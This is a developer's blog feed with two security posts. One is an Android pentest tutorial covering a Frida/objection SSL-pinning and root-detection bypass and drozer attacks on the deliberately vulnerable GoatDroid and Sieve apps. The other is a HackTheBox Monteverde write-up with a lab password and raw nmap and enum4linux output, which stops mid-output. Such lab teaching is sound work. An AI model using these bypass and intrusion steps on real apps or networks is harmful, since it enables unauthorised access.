<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-21T21:11:01+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rajat.Rao</title><subtitle>devlopr-jekyll is a Jekyll Theme Built For Developers
</subtitle><author><name>Rajat Rao</name></author><entry><title type="html">Mobile Security</title><link href="http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/" rel="alternate" type="text/html" title="Mobile Security" /><published>2020-06-10T14:35:23+05:30</published><updated>2020-06-10T14:35:23+05:30</updated><id>http://localhost:4000/hackthebox/2020/06/10/Mobile-Security</id><content type="html" xml:base="http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/">&lt;style&gt;
* {
  box-sizing: border-box;
}

.column {
  float: left;
  width: 33.33%;
  padding: 5px;
}

row::after {
  content: &quot;&quot;;
  clear: both;
  display: table;
}
&lt;/style&gt;

Just as security audits of web applications are performed for multiple organizations, a draw of interest can be made in Mobile applications as well.

The primary objective for a mobile application penetration test is to identify exploitable vulnerabilities in code, system, network, application, databases, Api's etc before hackers are able to discover and exploit them. Application penetration testing will reveal real-world opportunities for hackers to be able to compromise application and databases in such a way that allows for unauthorized access to sensitive data or even take-over application for malicious/non-business purposes.

Android Penetration focuses on three level on analysis

`1)Static:` Checks with respect to code levels will be performed

`2)Network:` Intercepting the request sent by the android application and interaction between the application and server is audited.

`3)Interactive:` While the applications provide its service, they tend to store a lot of confidential data in the respective mobile device itself dynamically. An audit of the internal storage of the device is performed.
	
	
The Mobile Security Series will be divided into the following chapters:


* [Chapter 1: Android Application Fundamentals]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter1)

* [Chapter 2: Setup Mobile Testing Platform]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter2) 

* [Chapter 3: Static Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter3)	

* [Chapter 4: Dynamic Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter4)

* [Chapter 5: Interactive Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter5)

&lt;p id=&quot;chapter1&quot;&gt;&amp;nbsp;&lt;/p&gt;

&lt;h2 id=&quot;chapter1&quot;&gt;Chapter 1: Android Application Fundamentals (Basics)&lt;/h2&gt;

An **APK** is an archive that usually contains the following directories:

- **AndroidManifest.xml**: It is a control file that tells the system what to do with all top-level components (**service, activity, broadcast receiver and content provider**). It also contains the permission required for an application to run

- **META-INF** directory:

	&amp;nbsp; ◦ MANIFEST.MF: The Manifest File

	&amp;nbsp; ◦  CERT.RSA: The certificate of the applications

	&amp;nbsp; ◦  CERT.SF: The list of resources and SHA-1 digest of the corresponding lines in the MANIFEST.MF file.

- **lib**: The directory containing the compiled code that is specific to a software layer of a processor, the directory is split into more directories within it

	&amp;nbsp; ◦  armeabi: compiled code for all ARM based processors only

	&amp;nbsp; ◦  armeabi-v7a: compiled code for all ARMv7 and above based processors only

	&amp;nbsp; ◦  x86: compiled code for X86

	&amp;nbsp; ◦  mips: compiled code for MIPS processors only

- **res**: The directory containing resources not compiled into resources.arsc (see below).

- **assets**: A directory containing applications assets, which can be retrieved by AssetManager.

- **classes.dex**: The classes compiled in the dex file format understandable by the Dalvik virtual machine

- **resources.arsc**: A file containing precompiled resources, such as binary XML for example.

&amp;nbsp; 

Android Application assessment focuses on the below components:

- **Content Provider**: It supplies data from one application to another. It can store the data in the file system, an SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()

- **Activity**: An activity represents a single screen with a user interface. For example, a login page can be called as an activity.

- **Services**: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background

- **Broadcast Receivers**: A broadcast receiver is a component that responds to system-wide broadcast announcements

&amp;nbsp; 
&lt;p id=&quot;chapter2&quot;&gt;&amp;nbsp;&lt;/p&gt;

&lt;h2 id=&quot;chapter2&quot;&gt;Chapter 2: Setup Mobile Testing Platform  &lt;/h2&gt;

Setting up an environment for any security assessment is a must. For Android Security, it is suggested to be dependent more on Kali Linux/Tamer operating system. &lt;b&gt;Kali Linux&lt;/b&gt; is an advanced penetration testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.&lt;b&gt;Android Tamer&lt;/b&gt; is a virtual/live platform for Android Security professionals where all the tools are inculcated within the OS. 

The very first step is to install Virtual Kali Linux/Android Tamer on Vmware. Following is the list of useful URLs for downloads:

&lt;b&gt;VMware&lt;/b&gt;: [https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html](https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html)

&lt;b&gt;Kali Linux&lt;/b&gt;: [https://www.kali.org/downloads/](https://www.kali.org/downloads/)

&lt;b&gt;Android Tamer&lt;/b&gt;: [https://androidtamer.com/tamer4-release](https://androidtamer.com/tamer4-release)

For newbies into cyber security, we'll be creating a dedicated post for installation steps for &lt;b&gt;VMWare&lt;/b&gt; and &lt;b&gt;virtual machines&lt;/b&gt; (.iso and .ova) in near future.

For assessing Mobile application, we need a dedicated android testing device to perform assessments. However, the same can be performed by creating a virtual Android environment with the help of a tool named Genymotion. It is a Cross-platform Android Emulator for developers &amp; QA engineers. It is dependent on VirtualBox. Following is the list of URL for downloads-

&lt;b&gt;VirtualBox&lt;/b&gt;: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)

&lt;b&gt;Genymotion&lt;/b&gt;: [https://www.genymotion.com/fun-zone/](https://www.genymotion.com/fun-zone/)    
     
&amp;nbsp;
      
&lt;h3&gt;2.1 || Genymotion&lt;/h3&gt;

--&gt; `Start Genymotion`

![deploy using travis](/assets/img/posts/Mobile_Security/1.png){:class=&quot;img-fluid&quot;}

--&gt; `Add Virtual Device`

![deploy using travis](/assets/img/posts/Mobile_Security/2.png){:class=&quot;img-fluid&quot;}

--&gt; `Select Google Pixel XL with API &gt;=6.0 and click Next`

![deploy using travis](/assets/img/posts/Mobile_Security/3.png){:class=&quot;img-fluid&quot;}

--&gt; `Install the selected emulator`

![deploy using travis](/assets/img/posts/Mobile_Security/4.png){:class=&quot;img-fluid&quot;}


![deploy using travis](/assets/img/posts/Mobile_Security/5.png){:class=&quot;img-fluid&quot;}  

&amp;nbsp;

&lt;h3&gt;2.2 || Required tools&lt;/h3&gt;

Once genymotion is installed, the next step for android security assessments is to setup following list of tools in &lt;b&gt;Kali Linux&lt;/b&gt;:

&lt;b&gt;Mobsf (Docker)&lt;/b&gt;: [https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) 

&lt;b&gt;Drozer&lt;/b&gt;: [https://github.com/FSecureLABS/drozer/releases](https://github.com/FSecureLABS/drozer/releases) 

&lt;b&gt;Superanalyzer&lt;/b&gt;: [https://github.com/FSecureLABS/drozer/releases](https://github.com/FSecureLABS/drozer/releases)  
  
&lt;p id=&quot;chapter3&quot;&gt;&amp;nbsp;&lt;/p&gt;

&lt;h2&gt;Chapter 3: Static Analysis  &lt;/h2&gt;

Static Application Security Testing is a set of technologies designed to analyze the application source code that are indicative of security vulnerabilities. Now as required tools are installed, we can start with security assessment of Android Applications.

&lt;h3&gt;3.1 || Mobsf (Docker)&lt;/h3&gt;

&lt;b&gt;Mobile Security Framework (MobSF)&lt;/b&gt; is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware-analysis and security assessment framework capable of performing static and dynamic analysis.

In this section of &lt;b&gt;Mobsf&lt;/b&gt;, we’ll be focusing more on static analysis.

--&gt; `Start mobsf via Docker`

```yml
$ git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
$ cd Mobile-Security-Framework-MobSF
$ docker build -t mobsf .
$ docker run -it -p 8000:8000 mobsf
```
--&gt; `Upload and Scan APK`

![deploy using travis](/assets/img/posts/Mobile_Security/6.png){:class=&quot;img-fluid&quot;}  

![deploy using travis](/assets/img/posts/Mobile_Security/7.png){:class=&quot;img-fluid&quot;}  

  &amp;nbsp; 
  
&lt;h3&gt;3.2 || Superanalyzer &lt;/h3&gt;

--&gt; `Run Superanalyzer against APK`

```yml
$ super-analyzer -v goatdroid.apk
```
The output of the super-anaylzer is stored in the form of HTML and can view defects found with respect to the application.

![deploy using travis](/assets/img/posts/Mobile_Security/8.png){:class=&quot;img-fluid&quot;}  

  &amp;nbsp; 
  
&lt;h3&gt;3.3 || d2j-dex2jar &amp; jd-gui &lt;/h3&gt;
	
&lt;b&gt;d2j-dex2jar&lt;/b&gt; tool helps one to reverse engineer the apk to jar version of it. The jar version helps to displays the code and can be examined for security purposes.

```yml
$d2j-dex2jar goatdroid.apk
$jd-gui → select jar file of goatdroid apk
```
![deploy using travis](/assets/img/posts/Mobile_Security/9.png){:class=&quot;img-fluid&quot;}  

&lt;p id=&quot;chapter4&quot;&gt;&amp;nbsp;&lt;/p&gt;

&lt;h2&gt;Chapter 4: Network Analysis &lt;/h2&gt;

Network analysis deals with communication of application with the server providing data. Here, analysis is done similarly the way analysis of web application is done by setting a proxy and intercepting every request to &lt;b&gt;Burpsuite&lt;/b&gt;.

&lt;h3&gt;4.1 || Setup Proxy in Mobile &lt;/h3&gt;

&lt;div class=&quot;row&quot;&gt;
  &lt;div class=&quot;column&quot;&gt;
    &lt;img src=&quot;/assets/img/posts/Mobile_Security/10.png&quot; alt=&quot;Snow&quot; style=&quot;width:100%&quot;&gt;
    &lt;figcaption style=&quot;text-align: center;&quot;&gt;Fig.1 &lt;/figcaption&gt;

  &lt;/div&gt;
  &lt;div class=&quot;column&quot;&gt;
    &lt;img src=&quot;/assets/img/posts/Mobile_Security/11.png&quot; alt=&quot;Forest&quot; style=&quot;width:100%&quot;&gt;
    &lt;figcaption style=&quot;text-align: center;&quot;&gt;Fig.2 &lt;/figcaption&gt;
  &lt;/div&gt;
  &lt;div class=&quot;column&quot;&gt;
    &lt;img src=&quot;/assets/img/posts/Mobile_Security/12.png&quot; alt=&quot;Mountains&quot; style=&quot;width:100%&quot;&gt;
    &lt;figcaption style=&quot;text-align: center;&quot;&gt;Fig.3 &lt;/figcaption&gt;
  &lt;/div&gt;
&lt;/div&gt; 

  &amp;nbsp; 

&lt;h3&gt;4.2 || SSL Pinning and Root Detection Bypass &lt;/h3&gt;

Here, SSL Pinning allows the application to only trust the valid or pre-defined certificate or Public Key. The application developer uses SSL Pinning technique as an additional layer for application traffic.

Below we are going to discuss about steps to bypass SSL Pinning.

--&gt; `Install Frida`

```yml
$ pip3 install frida
$ pip3 install objection
$ pip3 install frida-tools
```
Download the fridascript.js script for hooking from the following link:[https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/)

--&gt; `Connect Device to ADB`

```yml
$ adb connect 192.18.0.105:5555
$ adb devices (To check connected devices)
```
--&gt; `Find and Install Target application (Frida server) in device`

```yml
$ adb shell getprop ro.product.cpu.abi (To check architecture of device)
```
Download the Frida Server script according to above command output from the following link: [https://github.com/frida/frida/releases/](https://github.com/frida/frida/releases/)

--&gt; `Push Frida Server to device`

```yml
$ adb push frida-server-12.8.14-android-x86 /data/local/tmp
$ adb shell chmod 777 /data/local/tmp/frida-server-12.8.14-android-x86
```
--&gt; `Bypass SSL pinning &amp; Root Detection`

```yml
$ adb push fridascript.js /data/local/tmp
$ adb shell /data/local/tmp/frida-server-12.8.14-android-x86 &amp; (Running frida server)
$ frida-ps -u (Check running processes in device)
$ objection –gadget com.ril.ajio explore → android sslpinning disable/android root
disable(For bypassing Root Detection)
```

&lt;p id=&quot;chapter5&quot;&gt;&amp;nbsp;&lt;/p&gt;

&lt;h2 &gt;Chapter 5: Interactive Analysis &lt;/h2&gt;

Interactive Anaylysis can also be called as **Ineteractive Application Security Assessment (IAST)**. It is basically combination **Static Application Security Assessment (SAST)** and **Dynamic Application Security Assessment (DAST)**. In layman terms, **DAST** deals at interactive level .i.e at runtime level where the application is performing it's functionality. Following is the list of methods that can used in **DAST** methodology:

&lt;h3&gt;5.1 || Drozer &lt;/h3&gt;

Drozer provides tools to help you use and share public exploits for android. It is primarily used to assess following components in Android:

- **Content Provider**: It supplies data from one application to another. It can store the data in the file system, a SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()

- **Activity**: An activity represents a single screen with a user interface. For example, a login page can be called as an activity

- **Services**: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background.

- **Broadcast Receivers**: A broadcast receiver is a component that responds to system-wide broadcast announcements

Let’s move on to usage of drozer

--&gt; `Install drozer agent in client`

![deploy using travis](/assets/img/posts/Mobile_Security/13.png){:class=&quot;img-fluid&quot;}


--&gt; `Activate Drozer Agent`

![deploy using travis](/assets/img/posts/Mobile_Security/14.png){:class=&quot;img-fluid&quot;}

--&gt; `Connect to Drozer Agent via below command`

```yml
$ adb forward tcp:31415 tcp:31415
$ drozer console connect
```

![deploy using travis](/assets/img/posts/Mobile_Security/15.png){:class=&quot;img-fluid&quot;}

--&gt; `Atacking Activities`

```yml
$ run app.activity,info -a org.owasp.goatdroid.fourgoats
```

![deploy using travis](/assets/img/posts/Mobile_Security/16.png){:class=&quot;img-fluid&quot;}

```yml
$ run app.activity.start –-component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.ViewProfile
```
![deploy using travis](/assets/img/posts/Mobile_Security/17.png){:class=&quot;img-fluid&quot;}

--&gt; `Atacking Services`

```yml
$ run app.service.info -a org.owasp.goatdroid.fourgoats
```

![deploy using travis](/assets/img/posts/Mobile_Security/18.png){:class=&quot;img-fluid&quot;}

```yml
$ run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService
```

![deploy using travis](/assets/img/posts/Mobile_Security/19.png){:class=&quot;img-fluid&quot;}


--&gt; `Atacking Broadcast Receivers`

```yml
$ run app.package.info -a org.owasp.goatdroid.fourgoats
```

![deploy using travis](/assets/img/posts/Mobile_Security/20.png){:class=&quot;img-fluid&quot;}

To exploit SendSMSNowReceiver, we need to check corresponding action name in AndroidManifest.xml file which can be extracted with the help of apktool command. Following is the command to run:

```yml
$ apktool d goatdroid.apk
```

![deploy using travis](/assets/img/posts/Mobile_Security/21.png){:class=&quot;img-fluid&quot;}

To call the broadcast receiver, we need to send few parameters which can be found in decompiled jar version as explained in dex2jar chapter.

![deploy using travis](/assets/img/posts/Mobile_Security/22.png){:class=&quot;img-fluid&quot;}

Following command triggers Broadcast receivers: 

```yml
$ run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message &quot;Hey!&quot;
```

![deploy using travis](/assets/img/posts/Mobile_Security/23.png){:class=&quot;img-fluid&quot;}

![deploy using travis](/assets/img/posts/Mobile_Security/24.png){:class=&quot;img-fluid&quot;}


--&gt; `Atacking Content Providers`

```yml
$ run app.provider.finduri com.mwr.example.sieve
```

![deploy using travis](/assets/img/posts/Mobile_Security/25.png){:class=&quot;img-fluid&quot;}

```yml
$ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
```

![deploy using travis](/assets/img/posts/Mobile_Security/26.png){:class=&quot;img-fluid&quot;}</content><author><name>Rajat Rao</name></author><category term="[&quot;HackTheBox&quot;]" /><summary type="html"></summary></entry><entry><title type="html">HackTheBox Monteverde Writeup</title><link href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/" rel="alternate" type="text/html" title="HackTheBox Monteverde Writeup" /><published>2020-06-05T15:22:20+05:30</published><updated>2020-06-05T15:22:20+05:30</updated><id>http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/">## Brief
&amp;nbsp; &amp;nbsp; On enumerating different services of `Monteverde` machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using `smb_login` module from `metasploit`. Levering the misconfiguration, we were able to login to `SMB` with the help of `smbclient` and on further enumeration, we were able to extract a file named `azure.xml` under `mhope` user folder consisting of credentails of the same user. Making the use of credential found, we were able to get `Windows Remote Management` shell with the help of tool named `evil-winrm` which targets on port `5985` port. Here, we were able to get basic shell and were able pwn the `user.txt` part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has `Azure Active Directory Connect`. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting `root.txt`

&amp;nbsp;

## Flow
- `enum4linux` reveals list of users name

- Brute Forcing `SMb` via `metasploit` using the usernames as password identifies a legit credential (`SABatchJobs:SABatchJobs`)

- Login as `SABatchJobs` in `SMB` via `smbcleint`

- Enumerate `mhope` folder and download `azure.xml` which consists of mhope credentials (`mhope:4n0therD4y@n0th3r$`)

- Login as `mhope` in Win-RM Service (5985) using `evil-winrm`

- Get `user.txt`

- Local enumeramation discloses usage of `Azure AD Connect` in target machine

- Search for Azure AD exploit leads to powershell script (module) to generate new `administrator` password in the target machine

- Use newly generated `administrator` credentials and login as `administrator` in `Win-RM service` (5985) using `evil-winrm`

- Get `root.txt`

&amp;nbsp;

Below is a detail writeup of the machine following the below steps:

1. [Information Gathering]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering)

2. [Low-Privilege Shell]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell)

3. [Privilege Escalation]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion)

&lt;p id=&quot;informationgathering&quot;&gt;&amp;nbsp;&lt;/p&gt;

## 1. Information Gathering 
&amp;nbsp;
### 1.1 || Nmap 

-&gt; `Run nmap`
```yml
$ nmap -sC -sV -p- -oA full 10.10.10.172
```
where, 

&amp;nbsp; &amp;nbsp; -sC : Run Default Scripts

&amp;nbsp; &amp;nbsp; -sV : Enumerate different versions

&amp;nbsp; &amp;nbsp; -sC : Store the output in all format (.nmap, .xml and .gnmap) having name full

**Result:**

```yml

# Nmap 7.80 scan initiated Tue May 26 14:02:41 2020 as: nmap -sC -sV -p- -oA full -Pn 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.13s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
   fingerprint-strings: 
   DNSVersionBindReqTCP: 
     version
_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-26 07:53:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 _http-server-header: Microsoft-HTTPAPI/2.0
 _http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49778/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/26%Time=5ECCD5D6%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03&quot;);
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
 _clock-skew: -46m43s
  smb2-security-mode: 
    2.02: 
 _    Message signing enabled and required
  smb2-time: 
    date: 2020-05-26T07:55:26
 _  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 26 14:14:49 2020 -- 1 IP address (1 host up) scanned in 728.28 seconds

```
&amp;nbsp;

### 1.2 || enum4linux

**Enum4linux** is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com. 
&amp;nbsp;

-&gt; `Run enum4linux`

```yml
enum4linux 10.10.10.172
```

**Result:**
```yml
enum4linux 10.10.10.172
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 26 13:41:48 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.172    |
 ============================================ 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================== 
|    Session Check on 10.10.10.172    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.172 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.172    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.172    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.172 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.10.172 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally MorganDesc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 ========================================= 
|    Share Enumeration on 10.10.10.172    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ==================================================== 
|    Password Policy Information for 10.10.10.172    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.10.172)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: Missing required parameter 'digestmod'.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.172    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
